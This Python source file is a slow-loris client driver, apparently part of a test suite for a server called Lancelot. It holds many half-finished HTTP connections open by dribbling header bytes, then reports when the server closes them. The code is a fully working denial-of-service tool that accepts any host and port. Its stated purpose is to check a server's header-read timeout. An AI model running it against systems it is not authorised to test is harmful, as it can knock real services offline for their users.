"""Slow-loris client driver for T1.3 mixed adversarial+benign cohort.

Opens N concurrent TCP connections to a target host:port, sends the start of
an HTTP/1.1 request, then dribbles one header byte every DRIBBLE_MS ms
without ever sending the trailing CRLF CRLF. A well-behaved server should
close each connection at its header-read deadline (Lancelot:
LANCELOT_HEADER_TIMEOUT_MS, default 15s).

Reports per-connection outcome: closed-after-N-bytes / dropped / responded.
Usage:
    python slow_loris.py <host> <port> --connections N --dribble-ms 200 \\
        --duration-s 30 --json-out /tmp/slowloris.json
"""
from __future__ import annotations

import argparse
import asyncio
import json
import os
import socket
import sys
import time
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class Outcome:
    n_bytes_sent: int = 0
    closed_at_s: Optional[float] = None
    error: Optional[str] = None
    responded: bool = False


@dataclass
class Summary:
    n_total: int = 0
    n_closed: int = 0
    n_errored: int = 0
    n_responded: int = 0
    closed_at_p50_s: float = 0.0
    closed_at_p95_s: float = 0.0
    closed_at_max_s: float = 0.0
    outcomes: list[Outcome] = field(default_factory=list)

    def add(self, o: Outcome) -> None:
        self.n_total += 1
        if o.responded:
            self.n_responded += 1
        elif o.error:
            self.n_errored += 1
        else:
            self.n_closed += 1
        self.outcomes.append(o)

    def finalize(self) -> None:
        closes = sorted(o.closed_at_s for o in self.outcomes if o.closed_at_s is not None)
        if closes:
            self.closed_at_p50_s = closes[len(closes) // 2]
            self.closed_at_p95_s = closes[min(int(len(closes) * 0.95), len(closes) - 1)]
            self.closed_at_max_s = closes[-1]


async def dribble_one(host: str, port: int, dribble_s: float, deadline_s: float) -> Outcome:
    """Connect, send GET, then dribble bytes one-by-one until the server
    closes us OR the duration deadline elapses."""
    o = Outcome()
    start = time.monotonic()
    try:
        reader, writer = await asyncio.open_connection(host, port)
    except Exception as e:  # pragma: no cover — defensive
        o.error = f"connect: {e!r}"
        return o

    # Send the request line + a Host header to look legit, then dribble.
    head = b"GET /echo HTTP/1.1\r\nHost: %s:%d\r\n" % (host.encode(), port)
    writer.write(head)
    try:
        await writer.drain()
    except Exception as e:
        o.error = f"drain head: {e!r}"
        writer.close()
        return o
    o.n_bytes_sent = len(head)

    # Now dribble: send one byte per dribble_s of a fake header that never ends.
    byte_idx = 0
    while True:
        now = time.monotonic()
        if now - start > deadline_s:
            break
        try:
            # Send one byte of a fake "X-Slow: <bytes>" header.
            b = b"X" if byte_idx % 4 == 0 else b":" if byte_idx % 4 == 1 else b" " if byte_idx % 4 == 2 else b"a"
            writer.write(b)
            await writer.drain()
            o.n_bytes_sent += 1
            byte_idx += 1
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            o.closed_at_s = time.monotonic() - start
            o.error = None  # being closed by the server is the expected outcome
            break
        # Check if the server already started writing a response (e.g. 408).
        try:
            resp = await asyncio.wait_for(reader.read(1), timeout=0.001)
            if resp:
                o.responded = True
                o.closed_at_s = time.monotonic() - start
                break
        except asyncio.TimeoutError:
            pass
        except Exception:
            o.closed_at_s = time.monotonic() - start
            break
        try:
            await asyncio.sleep(dribble_s)
        except asyncio.CancelledError:
            break

    try:
        writer.close()
        await writer.wait_closed()
    except Exception:
        pass
    if o.closed_at_s is None and o.error is None:
        o.closed_at_s = time.monotonic() - start
    return o


async def main_async(args: argparse.Namespace) -> int:
    deadline_s = args.duration_s
    dribble_s = args.dribble_ms / 1000.0

    sem = asyncio.Semaphore(args.connections)
    summary = Summary()

    async def run_one() -> None:
        async with sem:
            o = await dribble_one(args.host, args.port, dribble_s, deadline_s)
            summary.add(o)

    # Spawn args.connections tasks at once (the semaphore limits in-flight),
    # then keep spawning until the duration elapses.
    tasks: list[asyncio.Task] = []
    start = time.monotonic()
    while time.monotonic() - start < deadline_s:
        if len(tasks) - sum(1 for t in tasks if t.done()) < args.connections:
            tasks.append(asyncio.create_task(run_one()))
        await asyncio.sleep(0.05)

    # Wait for everyone (bounded by per-conn deadline).
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

    summary.finalize()

    print(f"slow-loris driver done: total={summary.n_total} "
          f"closed-by-server={summary.n_closed} "
          f"errored={summary.n_errored} "
          f"responded={summary.n_responded} "
          f"p50_close={summary.closed_at_p50_s:.2f}s "
          f"p95_close={summary.closed_at_p95_s:.2f}s "
          f"max_close={summary.closed_at_max_s:.2f}s")

    if args.json_out:
        with open(args.json_out, "w") as f:
            json.dump(
                {
                    "n_total": summary.n_total,
                    "n_closed_by_server": summary.n_closed,
                    "n_errored": summary.n_errored,
                    "n_responded": summary.n_responded,
                    "p50_close_s": summary.closed_at_p50_s,
                    "p95_close_s": summary.closed_at_p95_s,
                    "max_close_s": summary.closed_at_max_s,
                    "duration_s": args.duration_s,
                    "dribble_ms": args.dribble_ms,
                    "connections": args.connections,
                    "target": f"{args.host}:{args.port}",
                },
                f,
                indent=2,
            )
        print(f"json written to {args.json_out}")

    return 0


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("host")
    p.add_argument("port", type=int)
    p.add_argument("--connections", type=int, default=200,
                   help="number of concurrent slow-loris conns to maintain")
    p.add_argument("--dribble-ms", type=int, default=200,
                   help="ms between each header byte (default 200)")
    p.add_argument("--duration-s", type=int, default=30,
                   help="total run duration in seconds")
    p.add_argument("--json-out", default=None, help="write summary JSON here")
    return p.parse_args()


if __name__ == "__main__":
    sys.exit(asyncio.run(main_async(parse_args())))
